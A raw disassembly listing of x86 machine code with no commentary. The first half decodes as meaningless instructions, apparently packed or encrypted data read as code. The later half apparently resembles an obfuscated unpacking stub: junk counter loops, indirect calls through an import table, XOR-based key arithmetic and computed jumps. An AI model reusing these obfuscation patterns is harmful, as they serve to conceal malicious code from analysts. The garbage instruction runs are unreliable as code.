  406a59:	aam    0x22
  406a5b:	mov    ds:0xf276af8,al
  406a60:	adc    eax,0x9e9621b1
  406a65:	hlt    
  406a66:	retf   0x5ece
  406a69:	push   ebp
  406a6a:	mov    BYTE PTR [edx],cl
  406a6c:	cmp    esi,DWORD PTR [ecx+esi*1]
  406a6f:	ficom  WORD PTR [edi+eiz*8-0x44]
  406a73:	test   eax,0x48945336
  406a78:	adc    bl,ch
  406a7a:	es push 0xf
  406a7d:	jo     0x406a44
  406a7f:	or     eax,0x7e1c5dae
  406a85:	mov    ch,BYTE PTR [ebx-0x24fcbbb]
  406a8b:	fst    DWORD PTR [ecx]
  406a8d:	pop    es
  406a8e:	dec    edi
  406a8f:	cmp    BYTE PTR [esi-0x2],ah
  406a92:	daa    
  406a93:	add    al,0x79
  406a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a96:	push   ebx
  406a97:	push   0x6
  406a99:	mov    al,ds:0xb0882c96
  406a9e:	inc    esi
  406a9f:	jne    0x406aa6
  406aa1:	jmp    0x9a937f8e
  406aa6:	es mov edi,0xc16e9b1d
  406aac:	sahf   
  406aad:	loop   0x406b24
  406aaf:	push   edi
  406ab0:	or     eax,0xea5acd9
  406ab5:	call   0xffb3:0x73968eb5
  406abc:	jl     0x406a57
  406abe:	mov    ah,0x7c
  406ac0:	in     eax,0x84
  406ac2:	cmc    
  406ac3:	xchg   edx,eax
  406ac4:	cwde   
  406ac5:	cld    
  406ac6:	js     0x406af3
  406ac8:	loope  0x406a93
  406aca:	dec    ebp
  406acb:	stc    
  406acc:	sub    BYTE PTR [esi+0xa],dl
  406acf:	in     al,0x14
  406ad1:	inc    esp
  406ad2:	pop    ss
  406ad3:	inc    ebp
  406ad4:	xor    ah,BYTE PTR [edi+0x2de26dc5]
  406ada:	add    DWORD PTR [eax-0x626cc798],esp
  406ae0:	lea    ebp,[ecx]
  406ae2:	cmp    eax,0x69e0bb7c
  406ae7:	sahf   
  406ae8:	dec    edi
  406ae9:	pop    ss
  406aea:	ins    DWORD PTR es:[edi],dx
  406aeb:	sub    bh,BYTE PTR [edi-0x6]
  406aee:	add    DWORD PTR ds:0x7b53bdd6,ebp
  406af4:	xchg   ebx,eax
  406af5:	loope  0x406a7d
  406af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af8:	(bad)  
  406af9:	call   0xd659:0x6480b11d
  406b00:	xlat   BYTE PTR ds:[ebx]
  406b01:	sbb    eax,DWORD PTR [edx-0x4e]
  406b04:	es in  eax,0xa8
  406b07:	aas    
  406b08:	push   edi
  406b09:	add    BYTE PTR [ebp-0x2055665a],dl
  406b0f:	pop    ds
  406b10:	in     al,0x64
  406b12:	mov    ebx,0x4a96076a
  406b17:	or     edi,DWORD PTR [ebx]
  406b19:	cli    
  406b1a:	popf   
  406b1b:	push   eax
  406b1c:	popf   
  406b1d:	sub    eax,0xf864449e
  406b22:	xor    BYTE PTR [eax+0x14],al
  406b25:	(bad)  
  406b26:	mov    ecx,0xd3f9f882
  406b2b:	clc    
  406b2c:	mov    edx,0xcc03f500
  406b31:	xor    DWORD PTR [edi+0x19],edx
  406b34:	jne    0x406b60
  406b36:	jno    0x406b1b
  406b38:	or     eax,0xe8d081e7
  406b3d:	rcr    esp,cl
  406b3f:	sbb    DWORD PTR [ecx],esp
  406b41:	jmp    0x9f28db4
  406b46:	push   edx
  406b47:	mov    DWORD PTR [ecx],ebx
  406b49:	sbb    DWORD PTR [edx-0x4a73900],edx
  406b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b50:	pop    edx
  406b51:	inc    DWORD PTR ss:[edi]
  406b54:	pop    edx
  406b55:	mov    ebp,0x8f7a81f8
  406b5a:	test   eax,0xe0d94db7
  406b5f:	loope  0x406b1c
  406b61:	add    ebx,DWORD PTR [edx]
  406b63:	cli    
  406b64:	mov    ebx,eax
  406b66:	hlt    
  406b67:	cmc    
  406b68:	push   edi
  406b69:	inc    edx
  406b6a:	inc    ebx
  406b6b:	push   ebx
  406b6c:	push   eax
  406b6d:	mov    ecx,DWORD PTR [esi-0x9a18141]
  406b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b74:	push   ebp
  406b75:	mov    ebx,0x7bafb209
  406b7a:	mov    ebx,0x6f15ddbf
  406b7f:	adc    ebp,ebx
  406b81:	leave  
  406b82:	loop   0x406b3b
  406b84:	dec    edx
  406b85:	sub    BYTE PTR [ebx],bl
  406b87:	or     DWORD PTR [eax-0x3cb63782],esp
  406b8d:	and    eax,0x58ed733e
  406b92:	into   
  406b93:	out    dx,al
  406b94:	daa    
  406b95:	sbb    al,0x3c
  406b97:	xchg   esp,eax
  406b98:	push   edx
  406b99:	daa    
  406b9a:	fcomi  st,st(5)
  406b9c:	push   ds
  406b9d:	cmp    al,0x3a
  406b9f:	sbb    ebx,DWORD PTR [ecx-0xd858630]
  406ba5:	add    DWORD PTR [edi+ebx*8+0x8],esp
  406ba9:	jle    0x406bf8
  406bab:	out    dx,eax
  406bac:	pop    ds
  406bad:	pop    ds
  406bae:	push   edi
  406baf:	test   al,0x2c
  406bb1:	fnstcw WORD PTR [edi+0x27]
  406bb4:	shl    DWORD PTR [ebp+0x6f3804cf],cl
  406bba:	shl    al,0xc9
  406bbd:	sahf   
  406bbe:	lahf   
  406bbf:	daa    
  406bc0:	jo     0x406bb5
  406bc2:	jne    0x406bc8
  406bc4:	call   0xacac52f8
  406bc9:	lock xor ah,BYTE PTR [ecx]
  406bcc:	inc    edi
  406bcd:	and    BYTE PTR [ecx-0x69a32b83],0xb1
  406bd4:	retf   0x3f70
  406bd7:	add    ch,BYTE PTR [edi]
  406bd9:	inc    ebp
  406bda:	mov    ebx,0xefaeb252
  406bdf:	sub    al,BYTE PTR ds:0x3b133c18
  406be5:	lds    eax,FWORD PTR [ebx+ebx*4]
  406be8:	jle    0x406c4a
  406bea:	push   edi
  406beb:	xchg   edx,eax
  406bec:	jae    0x406c13
  406bee:	hlt    
  406bef:	mov    dh,0xbd
  406bf1:	sahf   
  406bf2:	cmp    DWORD PTR [esi+eiz*2-0x5],0x5f
  406bf7:	test   eax,0xdde927b7
  406bfc:	mov    ch,0xfe
  406bfe:	push   edx
  406bff:	mov    eax,ds:0x388ee2ad
  406c04:	repnz in al,dx
  406c06:	inc    ebp
  406c07:	icebp  
  406c08:	mov    ss,edi
  406c0a:	out    0x19,eax
  406c0c:	xchg   ecx,eax
  406c0d:	aas    
  406c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c0f:	jae    0x406bed
  406c11:	addr16 add al,0xa
  406c14:	pop    eax
  406c15:	xor    DWORD PTR [edi+0x16],0xb78ea12b
  406c1c:	call   0xffb1:0x6f18f90
  406c23:	enter  0x2725,0xd
  406c27:	push   es
  406c28:	cdq    
  406c29:	push   eax
  406c2a:	into   
  406c2b:	sub    eax,0xdc8372b5
  406c30:	push   edx
  406c31:	adc    BYTE PTR [esi],cl
  406c33:	pop    ecx
  406c34:	mov    eax,ds:0xa146ea06
  406c39:	push   ss
  406c3a:	mov    cl,0xe3
  406c3c:	mov    edi,0x8e442a84
  406c41:	jecxz  0x406c83
  406c43:	sar    DWORD PTR [esi-0x3daf8e12],1
  406c49:	sub    eax,0x29c840f
  406c4e:	add    BYTE PTR [eax],al
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xb0e22bde
  406c81:	es adc eax,0x7e7ec2c7
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	mov    ebx,0x917873fd
  406c90:	pop    esp
  406c91:	loope  0x406c80
  406c93:	add    cl,BYTE PTR [edx+0x111c0932]
  406c99:	cmp    ecx,DWORD PTR [ecx]
  406c9b:	imul   eax,DWORD PTR [ebx-0x6f],0xb7c8ee79
  406ca2:	test   DWORD PTR [esp+edx*4+0x4e4b3bc4],eax
  406ca9:	lods   eax,DWORD PTR ds:[esi]
  406caa:	addr16 dec ebp
  406cac:	sub    edi,DWORD PTR ds:0x7d14c6d1
  406cb2:	pop    eax
  406cb3:	cmp    bh,bl
  406cb5:	xchg   edx,eax
  406cb6:	out    0x7b,eax
  406cb8:	lea    esi,[edi-0x17479d16]
  406cbe:	inc    ebp
  406cbf:	es nop
  406cc1:	es sbb al,0x83
  406cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cc5:	adc    al,0x9e
  406cc7:	and    eax,0xd37fc0c
  406ccc:	xchg   esi,eax
  406ccd:	push   0x2e
  406ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd0:	inc    eax
  406cd1:	pusha  
  406cd2:	pop    edx
  406cd3:	dec    edi
  406cd4:	cli    
  406cd5:	cmp    edi,DWORD PTR ds:0x73b15d8c
  406cdb:	adc    ebp,eax
  406cdd:	xor    ah,BYTE PTR [edi+edi*8]
  406ce0:	cwde   
  406ce1:	data16 aaa 
  406ce3:	jns    0x406d10
  406ce5:	jne    0x406cd7
  406ce7:	in     al,0xae
  406ce9:	mov    cl,0x74
  406ceb:	ficomp DWORD PTR [ebx]
  406ced:	imul   ebp,DWORD PTR [ebp+0x55],0x743a93cf
  406cf4:	mov    esi,edx
  406cf6:	pusha  
  406cf7:	cmp    bh,0x97
  406cfa:	stos   DWORD PTR es:[edi],eax
  406cfb:	loope  0x406d67
  406cfd:	jl     0x406c9c
  406cff:	inc    edx
  406d00:	bound  eax,QWORD PTR [ebp+0x54]
  406d03:	stc    
  406d04:	imul   eax,DWORD PTR [edx-0x13],0x17
  406d08:	je     0x406d28
  406d0a:	inc    eax
  406d0b:	mov    ?,esi
  406d0d:	jno    0x406d78
  406d0f:	clc    
  406d10:	pusha  
  406d11:	aas    
  406d12:	jne    0x406ccc
  406d14:	adc    esi,ecx
  406d16:	(bad)  
  406d17:	or     eax,0xc3d90b86
  406d1c:	call   0xcb65:0x8756441a
  406d23:	xor    DWORD PTR [edi],edx
  406d25:	outs   dx,BYTE PTR ds:[esi]
  406d26:	dec    ebp
  406d27:	ss daa 
  406d29:	mov    ds:0xcb8d2c9d,al
  406d2e:	popa   
  406d2f:	(bad)  
  406d30:	jg     0x406d6e
  406d32:	out    0x84,al
  406d34:	out    dx,al
  406d35:	jbe    0x406d23
  406d37:	jbe    0x406d50
  406d39:	inc    esi
  406d3a:	je     0x406cf3
  406d3c:	rcr    BYTE PTR [edx-0x16200566],1
  406d42:	push   ebx
  406d43:	xlat   BYTE PTR ds:[ebx]
  406d44:	mov    al,0xa8
  406d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d47:	mov    al,0x63
  406d49:	test   eax,0x9511fed6
  406d4e:	sbb    cl,BYTE PTR [esi+0x37]
  406d51:	adc    BYTE PTR [ebx],ah
  406d53:	sub    al,0xe7
  406d55:	xchg   ebp,eax
  406d56:	pop    eax
  406d57:	aam    0xdd
  406d59:	data16 out dx,al
  406d5b:	push   ebp
  406d5c:	enter  0x9472,0x8f
  406d60:	ror    DWORD PTR [eax],0x32
  406d63:	imul   DWORD PTR [edi+0x42]
  406d66:	(bad)  
  406d67:	shr    BYTE PTR [esi+0xe940293],cl
  406d6d:	dec    esi
  406d6e:	sub    al,0x57
  406d70:	mov    esi,0x5c7df3cf
  406d75:	dec    eax
  406d77:	push   ebp
  406d78:	test   al,0xae
  406d7a:	sub    eax,0xb5dff38
  406d7f:	jecxz  0x406df2
  406d81:	setle  BYTE PTR [edi+0x5c1c0eb7]
  406d88:	jmp    0x406e08
  406d8a:	xchg   ecx,eax
  406d8b:	pop    edi
  406d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d8d:	jmp    0x8a4053be
  406d92:	pop    eax
  406d93:	cli    
  406d94:	leave  
  406d95:	fadd   DWORD PTR [ecx+0x1d]
  406d98:	push   ds
  406d99:	mov    BYTE PTR [ebp-0x669fb788],ch
  406d9f:	popf   
  406da0:	cli    
  406da1:	dec    ebx
  406da2:	mov    dh,0x65
  406da4:	cmp    BYTE PTR [edx-0x30],cl
  406da7:	sub    al,0x5b
  406da9:	mov    eax,ds:0x4641b21e
  406dae:	dec    edi
  406daf:	jg     0x406d3f
  406db1:	mov    ebx,DWORD PTR [edx+0x61]
  406db4:	sub    esi,DWORD PTR [ebp+0xd]
  406db7:	in     eax,dx
  406db8:	retf   
  406db9:	rcl    BYTE PTR [esi],0x21
  406dbc:	dec    edx
  406dbd:	add    eax,0x6ae19a2
  406dc2:	aam    0xf4
  406dc4:	dec    ecx
  406dc5:	sar    DWORD PTR [eax],cl
  406dc7:	xchg   BYTE PTR [eax+0x3e],al
  406dca:	in     al,0x8d
  406dcc:	fnstcw WORD PTR [eax+eax*8-0x4]
  406dd0:	or     DWORD PTR [ebx+0x46],0x88f76af0
  406dd7:	inc    esp
  406dd8:	push   0x3086b9ac
  406ddd:	popf   
  406dde:	xor    ebx,edi
  406de0:	test   BYTE PTR [eax-0x3012306b],ah
  406de6:	xchg   BYTE PTR [ebp-0x29],ch
  406de9:	inc    ebx
  406dea:	scas   al,BYTE PTR es:[edi]
  406deb:	dec    ebx
  406dec:	adc    al,0x76
  406dee:	mov    dh,0xfb
  406df0:	cs jl  0x406dc9
  406df3:	push   edx
  406df4:	sub    DWORD PTR [esi+ecx*4-0x74fe6c58],esp
  406dfb:	ja     0x406ded
  406dfd:	add    edx,ecx
  406dff:	pop    ss
  406e00:	sub    BYTE PTR [ecx-0x16],bl
  406e03:	push   ecx
  406e04:	test   eax,0xf09909f1
  406e09:	stc    
  406e0a:	mov    ebp,ebp
  406e0c:	mov    ah,0xec
  406e0e:	hlt    
  406e0f:	cmp    al,0xaf
  406e11:	(bad)  [ecx-0x1fe4d0ea]
  406e17:	daa    
  406e18:	or     esi,ebp
  406e1a:	cli    
  406e1b:	mov    esi,DWORD PTR [eax-0x42471bd5]
  406e21:	daa    
  406e22:	repnz (bad) 
  406e24:	xchg   edx,eax
  406e25:	retf   
  406e26:	jge    0x406df4
  406e28:	lea    esi,[edi]
  406e2a:	xchg   BYTE PTR [edx-0x42255e59],bl
  406e30:	sub    al,0x0
  406e32:	stos   BYTE PTR es:[edi],al
  406e33:	add    eax,0x389b2e53
  406e38:	jecxz  0x406e28
  406e3a:	arpl   WORD PTR [ecx-0x7b],ax
  406e3d:	sub    DWORD PTR [edx-0x54],esp
  406e40:	retf   
  406e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e42:	retf   0x1c1c
  406e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e46:	div    DWORD PTR [edi]
  406e48:	clc    
  406e49:	or     al,0x84
  406e4b:	mov    edi,DWORD PTR [edi]
  406e4d:	bound  ebx,QWORD PTR [edx-0x71ecbbc8]
  406e53:	jbe    0x406e3a
  406e55:	adc    dl,BYTE PTR [ecx+0xa5211a9]
  406e5b:	pop    eax
  406e5c:	into   
  406e5d:	fst    QWORD PTR ds:[ecx+ebp*1]
  406e61:	pusha  
  406e62:	and    edi,DWORD PTR [ebx-0x2a]
  406e65:	add    eax,0x8fbb9b21
  406e6a:	jl     0x406e81
  406e6c:	div    ch
  406e6e:	dec    ebp
  406e6f:	test   BYTE PTR [edi+0x1f],dh
  406e72:	les    edx,FWORD PTR [edx]
  406e74:	mov    al,ds:0x742efab8
  406e79:	cli    
  406e7a:	mov    WORD PTR [ebx+0x71],ds
  406e7d:	xchg   esp,eax
  406e7e:	push   eax
  406e7f:	cmp    edx,ebp
  406e81:	mov    ecx,0x57f59da8
  406e86:	fmulp  st(1),st
  406e88:	xchg   ebx,eax
  406e89:	(bad)  
  406e8a:	out    dx,eax
  406e8b:	xor    ah,bh
  406e8d:	sahf   
  406e8e:	xchg   ecx,eax
  406e8f:	test   DWORD PTR ds:0xa8a96ba1,esi
  406e95:	jg     0x406e97
  406e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e98:	push   edx
  406e99:	and    ecx,DWORD PTR [ebx-0x19]
  406e9c:	xchg   edx,eax
  406e9d:	arpl   WORD PTR [esp+eax*4],di
  406ea0:	retf   
  406ea1:	jecxz  0x406e32
  406ea3:	sub    al,0x80
  406ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea6:	mov    edi,0xdaa59ecc
  406eab:	das    
  406eac:	(bad)  
  406ead:	fwait
  406eae:	test   eax,0xb339108d
  406eb3:	mov    bh,0x4d
  406eb5:	jg     0x406f0c
  406eb7:	fwait
  406eb8:	dec    esi
  406eb9:	jmp    0xa81136a4
  406ebe:	sbb    ebx,ebx
  406ec0:	cli    
  406ec1:	xchg   edx,eax
  406ec2:	arpl   WORD PTR [ebx+0x38],bp
  406ec5:	xor    edx,DWORD PTR [eax-0x53bbbb4d]
  406ecb:	cmp    bh,BYTE PTR [ecx-0x5378be0d]
  406ed1:	mov    BYTE PTR [ecx+0xb],ch
  406ed4:	or     BYTE PTR [esi-0x67bcc8b3],dh
  406eda:	js     0x406f13
  406edc:	xor    edx,DWORD PTR [edx+0x23]
  406edf:	std    
  406ee0:	ret    0x3aa5
  406ee3:	fcomp  QWORD PTR [eax]
  406ee5:	jl     0x406f12
  406ee7:	ret    0x9ef4
  406eea:	nop
  406eeb:	mov    eax,DWORD PTR [di+0x10]
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
